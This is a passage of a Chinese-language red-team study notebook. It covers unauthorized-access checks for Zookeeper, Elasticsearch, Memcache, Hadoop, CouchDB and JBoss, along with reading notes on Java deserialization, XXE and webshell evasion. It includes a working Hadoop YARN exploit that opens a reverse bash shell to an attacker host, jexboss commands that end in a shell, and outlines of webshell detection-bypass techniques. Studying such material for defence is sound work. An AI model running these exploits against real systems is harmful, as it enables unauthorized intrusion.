<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">ip, port, timeout</span>):</span>
    <span class="hljs-keyword">try</span>:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, <span class="hljs-built_in">int</span>(port)))
        flag = <span class="hljs-string">&quot;envi&quot;</span>
        <span class="hljs-comment"># envi</span>
        <span class="hljs-comment"># dump</span>
        <span class="hljs-comment"># reqs</span>
        <span class="hljs-comment"># ruok</span>
        <span class="hljs-comment"># stat</span>
        s.send(flag)
        data = s.recv(<span class="hljs-number">1024</span>)
        s.close()
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Environment&#x27;</span> <span class="hljs-keyword">in</span> data:
            <span class="hljs-keyword">return</span> <span class="hljs-string">u&quot;Zookeeper Unauthorized access&quot;</span>
    <span class="hljs-keyword">except</span>:
        <span class="hljs-keyword">pass</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    ip = <span class="hljs-string">&quot;1.1.1.1&quot;</span>
    <span class="hljs-built_in">print</span> check(ip, <span class="hljs-number">2181</span>, <span class="hljs-number">2</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre><p>参考资料：</p><ul><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lihao21/article/details/51778255">https://blog.csdn.net/lihao21/article/details/51778255</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wushijin/p/11654076.html">https://www.cnblogs.com/wushijin/p/11654076.html</a></li></ul><hr><h4 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h4><p>默认端口：9200</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_plugin/</span>head/ 	web管理界面
http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_cat/i</span>ndices
htp:<span class="hljs-regexp">//</span> localhost:<span class="hljs-number">9200</span><span class="hljs-regexp">/_river/</span>_search	查看数据库敏感信息
http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9200</span>/_nodes 			查看节点数</code></pre><p>脚本检测：</p><p><code>python3 elasticsearch_unauth.py 192.168.1.4 9200</code></p><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span>
<span class="hljs-comment"># elasticsearch未授权检测脚本</span>
<span class="hljs-comment"># author：ske</span>
<span class="hljs-comment"># usage: python3 elasticsearch_unauth.py ip port</span>
<span class="hljs-comment"># 默认端口9200</span>
<span class="hljs-comment"># http://localhost:9200/_plugin/head/ web管理界面</span>
<span class="hljs-comment"># http://localhost:9200/_cat/indices</span>
<span class="hljs-comment"># http://localhost:9200/_river/_search 查看数据库敏感信息</span>
<span class="hljs-comment"># http://localhost:9200/_nodes 查看节点数据</span>

<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">from</span> elasticsearch <span class="hljs-keyword">import</span> Elasticsearch
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json

ip = sys.argv[<span class="hljs-number">1</span>]
port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-comment"># 9200</span>
<span class="hljs-keyword">try</span>:
    es = Elasticsearch(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(ip, port), timeout=<span class="hljs-number">5</span>)  <span class="hljs-comment"># 连接Elasticsearch,延时5秒</span>
    es.indices.create(index=<span class="hljs-string">&#x27;unauth_text&#x27;</span>)
    print(<span class="hljs-string">&#x27;[+] 成功连接 ：&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip))
    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功创建测试节点unauth_text&#x27;</span>.<span class="hljs-built_in">format</span>(ip))
    es.index(index=<span class="hljs-string">&quot;unauth_text&quot;</span>, doc_type=<span class="hljs-string">&quot;test-type&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>, body=&#123;<span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>&#125;)
    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功往节点unauth_text插入数据&#x27;</span>.<span class="hljs-built_in">format</span>(ip))
    ret = es.get(index=<span class="hljs-string">&quot;unauth_text&quot;</span>, doc_type=<span class="hljs-string">&quot;test-type&quot;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-number">2</span>)
    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 成功获取节点unauth_text数据 : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, ret))
    es.indices.delete(index=<span class="hljs-string">&#x27;unauth_text&#x27;</span>)
    print(<span class="hljs-string">&#x27;[+] &#123;&#125; -&gt; 清除测试节点unauth_text数据&#x27;</span>.<span class="hljs-built_in">format</span>(ip))
    print(<span class="hljs-string">&#x27;[ok] &#123;&#125; -&gt; 存在ElasticSearch未授权漏洞&#x27;</span>.<span class="hljs-built_in">format</span>(ip))

    print(<span class="hljs-string">&#x27;尝试获取节点信息：↓&#x27;</span>)
    text = json.loads(requests.get(url=<span class="hljs-string">&#x27;http://&#123;&#125;:&#123;&#125;/_nodes&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port), timeout=<span class="hljs-number">5</span>).text)
    nodes_total = text[<span class="hljs-string">&#x27;_nodes&#x27;</span>][<span class="hljs-string">&#x27;total&#x27;</span>]
    nodes = <span class="hljs-built_in">list</span>(text[<span class="hljs-string">&#x27;nodes&#x27;</span>].keys())
    print(<span class="hljs-string">&#x27;[ok] &#123;&#125; -&gt; [&#123;&#125;] : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, nodes_total, nodes))

<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    error = e.args
    print(<span class="hljs-string">&#x27;[-] -&gt; &#123;&#125;  error : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, error))</code></pre><hr><h4 id="Memcache"><a href="#Memcache" class="headerlink" title="Memcache"></a>Memcache</h4><p>默认端口11211</p><p>提示连接成功表示漏洞存在</p><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> &lt;target&gt; <span class="hljs-number">11211</span>，或 nc -vv &lt;target&gt; <span class="hljs-number">11211</span></code></pre><p>Memcached端口是对外开放的，用nc或Telne可以直接登录，查看信息，增加修改都可以</p><p>参考</p><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrhonest/p/10881389.html">https://www.cnblogs.com/mrhonest/p/10881389.html</a></li></ul><hr><h4 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h4><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构<br>用户可以在不了解分布式底层细节的情况下，开发分布式程序<br>充分利用集群的威力进行高速运算和存储<br>在默认情况下，Hadoop允许任意用户访问管理接口</p><p>poc:</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
 
<span class="hljs-keyword">import</span> requests
 
target = <span class="hljs-string">&#x27;http://127.0.0.1:8088/&#x27;</span>
lhost = <span class="hljs-string">&#x27;192.168.220.137&#x27;</span> <span class="hljs-comment"># put your local host ip here, and listen at port 9999</span>
 
url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span>
resp = requests.post(url)
app_id = resp.json()[<span class="hljs-string">&#x27;application-id&#x27;</span>]
url = target + <span class="hljs-string">&#x27;ws/v1/cluster/apps&#x27;</span>
data = &#123;
    <span class="hljs-string">&#x27;application-id&#x27;</span>: app_id,
    <span class="hljs-string">&#x27;application-name&#x27;</span>: <span class="hljs-string">&#x27;get-shell&#x27;</span>,
    <span class="hljs-string">&#x27;am-container-spec&#x27;</span>: &#123;
        <span class="hljs-string">&#x27;commands&#x27;</span>: &#123;
            <span class="hljs-string">&#x27;command&#x27;</span>: <span class="hljs-string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,
        &#125;,
    &#125;,
    <span class="hljs-string">&#x27;application-type&#x27;</span>: <span class="hljs-string">&#x27;YARN&#x27;</span>,
&#125;
requests.post(url, json=data)
修改exploit.py中的反弹IP
python exploit.py</code></pre><p>HDFS</p><pre><code class="hljs apache"><span class="hljs-attribute">NameNode</span>	默认端口	<span class="hljs-number">50070</span> 
<span class="hljs-attribute">DataNode</span>	默认端口	<span class="hljs-number">50075</span>
<span class="hljs-attribute">httpfs</span>		默认端口	<span class="hljs-number">14000</span>
<span class="hljs-attribute">journalnode</span>	默认端口	<span class="hljs-number">8480</span></code></pre><p>YARN （JobTracker ）</p><pre><code class="hljs apache"><span class="hljs-attribute">ResourceManager</span>	默认端口	<span class="hljs-number">8088</span> 
<span class="hljs-attribute">Jobtracker</span>		默认端口	<span class="hljs-number">50030</span> 
<span class="hljs-attribute">TaskTracker</span>		默认端口	<span class="hljs-number">50060</span></code></pre><p>Hue默认端口8080</p><p>YARN（JobTracker）</p><pre><code class="hljs crmsh"><span class="hljs-keyword">master</span>			<span class="hljs-title">默认端口	6001</span>
regionserver	默认端口	<span class="hljs-number">60030</span></code></pre><p>hive- server2默认端口1000</p><p>spark- jdbcserver默认端口10003</p><p>开启身份验证，防止未经授权用户访问</p><hr><h4 id="Couchdb"><a href="#Couchdb" class="headerlink" title="Couchdb"></a>Couchdb</h4><p>默认端口5984</p><p>在local.ini配置中：<br>bind_address = 设置为0.0.0.0则存在未授权访问</p><p>直接加端口进行访问即可<br><strong>exp：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/couchdb/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">12636</span>/exp.py</code></pre><hr><h4 id="Ldap"><a href="#Ldap" class="headerlink" title="Ldap"></a>Ldap</h4><p>使用工具ldap admin直接连接即可</p><p>防御措施：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mrhonest/</span>p/<span class="hljs-number">10948657</span>.html   --建议
https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u011607971/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">86378361</span>   --管理方法</code></pre><hr><h4 id="JBOSS未授权访问"><a href="#JBOSS未授权访问" class="headerlink" title="JBOSS未授权访问"></a>JBOSS未授权访问</h4><p>vulhub漏洞平台可以复现，启用环境位置：vulhub-jboss-cve-2017-7504</p><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose up -d</span></code></pre><p>访问8080端口无账号密码就可进入</p><p>linux-kali-exp</p><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joaomatosf/</span>jexboss
cd jexboss 
python3 jexboss.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.107</span>:<span class="hljs-number">8080</span>/</code></pre><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/05.png" srcset="/img/loading.gif" alt="shell"></p><p>执行工具会依次检测一下项目，有漏洞就会显示红色的: <code>VULNERABLE</code>(易受攻击的)，工具就会根据找到容易受到攻击的点，进行利用</p><p>然后选择<code>YES</code>，就可以获得shell了</p><hr><h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><h4 id="Java下奇怪的命令执行"><a href="#Java下奇怪的命令执行" class="headerlink" title="Java下奇怪的命令执行"></a>Java下奇怪的命令执行</h4><p>参考文章：<a target="_blank" rel="noopener" href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">http://www.lmxspace.com/2019/10/08/Java下奇怪的命令执行/</a></p><hr><h4 id="Shiro反序列化记录"><a href="#Shiro反序列化记录" class="headerlink" title="Shiro反序列化记录"></a>Shiro反序列化记录</h4><p>漏洞搭建安装和复现：</p><ul><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1078421">https://cloud.tencent.com/developer/article/1078421</a></li><li><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li></ul><p><strong>Reference</strong></p><p>Pwn a CTF Platform with Java JRMP Gadget</p><ul><li><a target="_blank" rel="noopener" href="https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">https://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a></li><li><a target="_blank" rel="noopener" href="https://open.appscan.io/article-862.html">https://open.appscan.io/article-862.html</a></li><li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10ad968e1b2">https://www.jianshu.com/p/f10ad968e1b2</a></li></ul><p>Apache Shiro Java反序列化漏洞分析</p><ul><li><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a></li><li><a target="_blank" rel="noopener" href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/">https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability/</a></li></ul><hr><h4 id="RMI-反序列化"><a href="#RMI-反序列化" class="headerlink" title="RMI-反序列化"></a>RMI-反序列化</h4><p><strong>参考</strong><br><strong>RM官方文档</strong></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4711#toc-3">https://xz.aliyun.com/t/4711#toc-3</a> —浅显易懂的JAVA反序列化入门</p><p>知识盲区，需要脑补！！！！！</p><hr><h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><p>参考：（哎，知识盲区，加油脑补）</p><ul><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/115849.html">https://www.freebuf.com/vuls/115849.html</a> –Jndi注入及Spring RCE漏洞分析</li><li><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a> –在Java中利用JNDI注入</li><li><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a> –如何绕过高版本JDK的限制进行JNDI注入利用</li></ul><p><strong>RPC</strong></p><ul><li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2accc2840a1b">https://www.jianshu.com/p/2accc2840a1b</a> –如何给老婆解释什么是RPC</li><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/189835.html">https://www.freebuf.com/column/189835.html</a> —深入理解JNDI注入与Java反序列化漏洞利用</li></ul><p><strong>ldap</strong></p><ul><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a> –LDAP概念和原理介绍</li><li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7e4d99f6baaf">https://www.jianshu.com/p/7e4d99f6baaf</a> –LDAP入门</li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/caoyujiao520/article/details/82762097">https://blog.csdn.net/caoyujiao520/article/details/82762097</a> –LDAP入门使用</li></ul><hr><h4 id="fastjson漏洞浅析"><a href="#fastjson漏洞浅析" class="headerlink" title="fastjson漏洞浅析"></a>fastjson漏洞浅析</h4><p><strong>前言</strong></p><p>Fastion是一个Java语言编写的高性能功能完善的JSON库。它采用一种“假定有序快速匹配”的算法，把JS0N Parse的性能提升到极致，是目前Java语言中最快的JSON库。 Fastjson接口简单易用，已经被广泛使用在缓存序列化、协议交互、We输出、 Android客户端等多种应用场景</p><p><strong>参考链接</strong></p><ul><li><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/207439.html">https://www.freebuf.com/column/207439.html</a> —如何绕过高版本JDK的限制进行JNDI注入</li></ul><p>三个fastjson1.2…版本的poc，需要花很多时间来学习！！！</p><hr><h4 id="CVE-2019-11043-PHP远程代码执行复现"><a href="#CVE-2019-11043-PHP远程代码执行复现" class="headerlink" title="CVE-2019-11043 PHP远程代码执行复现"></a>CVE-2019-11043 PHP远程代码执行复现</h4><p><strong>简介</strong></p><p>相信大家都在满天的公众号预警里面看过很多,这里就一笔带过</p><p>2019年10月22日，国外安全研究员公开了一个PHP-FPM远程代码执行的漏洞EXP<br>该漏洞是 Andrew Danau在某比赛解决一道CTF题目时发现，向目标服务器URL发送%0a符号时，服务返回异常发现的漏洞</p><p>2019年9月26日，PHP官方发布漏洞通告其中指出使用 Nginx + php-fpm的服务器在部分配置下存在远程代码执行漏洞且该配置已被广泛使用，危害较大，影响较为广泛相关工具已经公开</p><p><strong>Github地址如下:</strong></p><pre><code class="hljs arcade">https:<span class="hljs-regexp">/github.com/</span>neex/phuip-fpizdam</code></pre><p>方法很多，我会写出来…后补！！！</p><hr><h4 id="java-webshell从入门到入狱系列1-基础篇"><a href="#java-webshell从入门到入狱系列1-基础篇" class="headerlink" title="java webshell从入门到入狱系列1-基础篇"></a>java webshell从入门到入狱系列1-基础篇</h4><p>本系列文章纯探讨技术交流，请勿使用本文探的技术构造恶意webshel非法入侵他人网站</p><p><strong>前言</strong></p><p>本系列，主要从webshell基础、 webshell的bypass技术（关键字、流量层、hook点逃逸）、后渗透的webshell维权（基于容器特性的隐式webshell、内存shell等）等方面和大家交流java中webshe‖的形式</p><p><strong>基础</strong></p><p><strong>java webshell种类</strong></p><p>现在大部分中间件容器，所能支持解析的后缀，主要是jsp，jspx 两种动态脚本为主，比如 tomcat容器中，默认能支持解析的动态脚本已经默认写在配置中了</p><pre><code class="hljs java">&lt;jsp-config&gt; 
&lt;jsp-property-group&gt; 
&lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt; 
&lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
&lt;scripting-invalid&gt;true&lt;/scripting-invalid&gt; 
&lt;/jsp-property-group&gt; 
&lt;/jsp-config&gt;</code></pre><p><strong>在目前常见的 webshel的后门种类,主要分如下几类：</strong></p><p>各种客户端的一句话 webshll （比如菜刀、冰蝎、蚁剑、c刀等常见客户端）、专门负责数据传输的webshell（与数据库进行交互）、Tune后门（基于 socks5协议的 reGeorg之类的）、小马（单纯的进行命令执行、单纯的进行文件管理/上传等功能)、大马（集成了文件管理、命令执行、数据库连接等多功能性大马）</p><p><strong>java执行命令方式</strong></p><p>在这节我们拿最基础的命令执行的来讨论，如何用多种方式写我们的负责命令执行的webshell</p><p>在java中，常见的能够执行命令的方式</p><p>java基础的webshell命令执行方式</p><p><strong>使用 java runtime exec()</strong></p><p>第一种常见的使，用 java.lang.Runtime 类进行执行系统命令，该方法也是目前市面上各种静态查杀 webshell 辅助工具首要盯着的目标，需要注意的是win 下和linux 需要区别对待，以及当使用多个命令组合使用注意坑。下面我们来看看代码。使用 Runtime类，调用exec执行命令返回一个Process对象,然后启一个 BufferedReader类，对返回的结果进行保存回显处理。执行exec的时候需要特别注意，带有|，&lt;，&gt; 等符号的命令需要使用如下代码的方式进行执行，要不然容易出错</p><p>讲解了webshell大部分能利用的机制：<br>Java 执行系统命令的方法和原理<br>用 ProcessBuilder 绕过检测<br>使用 Java 反射机制绕过检测<br>使用 Java 类加载机制绕过检测<br>获得 Class 对象的四种方法</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1180753</span>   --利用Java反射和类加载机制绕过JSP后门检测</code></pre><p>非常详细…</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>javasec.org<span class="hljs-regexp">/javase/</span>   --安全门</code></pre><p><strong>熟悉下Java反射基础：</strong><br>定义：<br>java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对<br>于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象的功能称为java语言的反射机制</p><p><strong>java反射涉及的类:</strong></p><pre><code class="hljs delphi">cass类：代表类的实体,在运行的Java应用程序中表示类和接口
Field类：代表类的成员变量(类的属性)
Method类：代表类的方法
<span class="hljs-function"><span class="hljs-keyword">Constructor</span>类：代表类的构造方法</span></code></pre><p><strong>Class类中常见使用的</strong><br>1）获取的类中的方法<br>for Name(String className)：根据类名返回类的对象<br>getName()：获得类的完整路径名字</p><p>2）获取类中属性相关</p><p>getFields()：获得所有公有的属性对象<br>getDeclaredFields()：获得所有属性对象(带Declared的可以获取到私有private)</p><p>3）获得类中方法<br>getMethods()：获得该类所有公有的方法<br>getDeclaredMethod( String name, Class…&lt;?&gt; parameterTypes)：获得该类某个方法<br>getDeclaredMethods()：获得该类所有方法</p><p><strong>Fed类常见使用的</strong><br>equals(Object obj)：属性与ob相等则返回true<br>get(Object obj)：获得obj中对应的属性值<br>set(Object obj, Object value)：设置obj中对应属性值</p><p><strong>Method类</strong></p><p>invoke(object obj, Object…args) 传递 object对象及参数调用该对象对应的方法</p><p><strong>Constructor类</strong></p><p>newInstance(Object…initargs)：根据传递的参数创建类的对象</p><hr><h4 id="深究XMLdecoder"><a href="#深究XMLdecoder" class="headerlink" title="深究XMLdecoder"></a>深究XMLdecoder</h4><p>Oracle关于这个 xmldecoder造成的漏洞的CVE编号分别是CVE2017-3506、CVE2017-10271、CVE2019-2725</p><p>最早关于CVE2017-3506的补丁只是根据 object标签进行了限制</p><p>而根据文章中讲解的继承关系 object替换成void即可，它们实际上是不受影响的，因此便出现了CVE-2017-10271，而针对CVE-2017-10271的补丁限定了所有具有执行的节点</p><p>但这次CVE-2019-2725主要是class标签，class标签可代替 object标签来生成对象，因此这次漏洞本质还是 xmldecoder的问题，而补丁也是针对class标签来处理的</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/fnmsd/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">89889144</span>   --fnmsd作者-XMLDecoder解析流程分析
https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">180725</span>   ---浅谈Weblogic反序列化——XMLDecoder的绕过史</code></pre><p>盲区，需要脑补！！！！</p><hr><h4 id="FastJson-反序列化学习"><a href="#FastJson-反序列化学习" class="headerlink" title="FastJson 反序列化学习"></a>FastJson 反序列化学习</h4><p>这篇文章总结的非常好：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">06</span><span class="hljs-regexp">/29/</span>FastJson-反序列化学习/</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">fastjson-remote-code-execute-poc：
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/shengqi158/</span>fastjson-remote-code-execute-poc

Fastjson <span class="hljs-number">1.2</span>.<span class="hljs-number">24</span>反序列化漏洞分析：
https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/vuls/</span><span class="hljs-number">178012</span>.html

Fastjson反序列化漏洞研究：
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/mrchang/</span>p/<span class="hljs-number">6789060</span>.html

Fastjson反序列化之TemplatesImpl调用链：
https:<span class="hljs-regexp">//</span>p0rz9.github.io<span class="hljs-regexp">/2019/</span><span class="hljs-number">05</span><span class="hljs-regexp">/12/</span>Fastjson反序列化之TemplatesImpl调用链/</code></pre><hr><h4 id="数据库安全思考之xml反序列化"><a href="#数据库安全思考之xml反序列化" class="headerlink" title="数据库安全思考之xml反序列化"></a>数据库安全思考之xml反序列化</h4><p>学习文章非常详细：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587690</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4452199</span></code></pre><p>参考：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>obtruse.syfrtext.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">07</span>/oracle-privilege-escalation-via.html</code></pre><hr><h4 id="Webshell绕安全模式执行命令"><a href="#Webshell绕安全模式执行命令" class="headerlink" title="Webshell绕安全模式执行命令"></a>Webshell绕安全模式执行命令</h4><p>绕过方法总结：</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.<span class="hljs-number">91</span>ri.org/<span class="hljs-number">8700</span>.html</code></pre><p>EXP和poc：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/yangyangwithgnu/</span>bypass_disablefunc_via_ld_preload</code></pre><hr><h4 id="Java-下的XEE漏洞"><a href="#Java-下的XEE漏洞" class="headerlink" title="Java 下的XEE漏洞"></a>Java 下的XEE漏洞</h4><p>该文章讲解了java xml下大部分的XEE漏洞原因和防御：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">10</span><span class="hljs-regexp">/31/</span>Java-XXE-总结/    --详细看看
https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">3372</span>    --有多余时间可以看看</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">Java XXE注入修复问题填坑实录:
https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>bTeJYzUN9T1u-KDZON5FiQ

修不好的洞，JDK的坑——从WxJava XXE注入漏洞中发现了一个对JDK的误会:
https:<span class="hljs-regexp">//m</span>p.weixin.qq.com<span class="hljs-regexp">/s/</span>bTeJYzUN9T1u-KDZON5FiQ

XML_External_Entity_Prevention_Cheat_Sheet：
https:<span class="hljs-regexp">//</span>cheatsheetseries.owasp.org<span class="hljs-regexp">/cheatsheets/</span>XML_External_Entity_Prevention_Cheat_Sheet.html<span class="hljs-comment">#Java</span>

一个被广泛流传的XXE漏洞错误修复方案：
https:<span class="hljs-regexp">//g</span>v7.me<span class="hljs-regexp">/articles/</span><span class="hljs-number">2019</span><span class="hljs-regexp">/a-widely-circulated-xxe-bug-fix/</span>

JAVA常见的XXE漏洞写法和防御：
https:<span class="hljs-regexp">//</span>blog.spoock.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">10</span><span class="hljs-regexp">/23/</span>java-xxe/</code></pre><hr><h4 id="Solr-Velocity模板远程代码复现及利用指南"><a href="#Solr-Velocity模板远程代码复现及利用指南" class="headerlink" title="Solr Velocity模板远程代码复现及利用指南"></a>Solr Velocity模板远程代码复现及利用指南</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.secpulse.com<span class="hljs-regexp">/archives/</span><span class="hljs-number">117281</span>.html   --详细复现防御
https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">11778478</span>.html
https:<span class="hljs-regexp">//g</span>ovuln.com<span class="hljs-regexp">/topic/</span><span class="hljs-number">501</span>/   --P牛解释</code></pre><hr><h4 id="Solr-RCE-via-Velocity-template"><a href="#Solr-RCE-via-Velocity-template" class="headerlink" title="Solr-RCE-via-Velocity-template"></a>Solr-RCE-via-Velocity-template</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.lmxspace.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">11</span><span class="hljs-regexp">/03/</span>Solr-RCE-via-Velocity-template/</code></pre><p><strong>Reference</strong></p><pre><code class="hljs awk">用Intellij idea搭建solr调试环境：
https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">4</span>ceeb2c20002

http:<span class="hljs-regexp">//</span>lucene.apache.org<span class="hljs-regexp">/solr/gui</span>de<span class="hljs-regexp">/6_6/</span>velocity-response-writer.html</code></pre><hr><h4 id="java-webshell-从入门到入狱系列2-攻防对抗之Bypass-上篇"><a href="#java-webshell-从入门到入狱系列2-攻防对抗之Bypass-上篇" class="headerlink" title="java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇"></a>java webshell 从入门到入狱系列2-攻防对抗之Bypass-上篇</h4><p>1）java反射bypass</p><p>2）反射的进阶版，通过结合利用byte字节码+反射的方式完全无任何痕迹的反射回显命令执行马</p><p>3）java 后门-unicode编码</p><hr><h4 id="java-webshell-从入门到入狱系列3-攻防对抗之Bypass-中篇"><a href="#java-webshell-从入门到入狱系列3-攻防对抗之Bypass-中篇" class="headerlink" title="java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇"></a>java webshell 从入门到入狱系列3-攻防对抗之Bypass-中篇</h4><p>其他姿势载入webshell的技巧tip</p><p>JavaWeb 随机后门（远程下载文件）</p><p>Java URLClassLoader 动态加载jar包 webshell</p><p>openrasp （开源应用运行时自我保护）Bypass</p><hr><h4 id="java-webshell-从入门到入狱系列4-攻防对抗之Bypass-下篇"><a href="#java-webshell-从入门到入狱系列4-攻防对抗之Bypass-下篇" class="headerlink" title="java webshell 从入门到入狱系列4-攻防对抗之Bypass-下篇"></a>java webshell 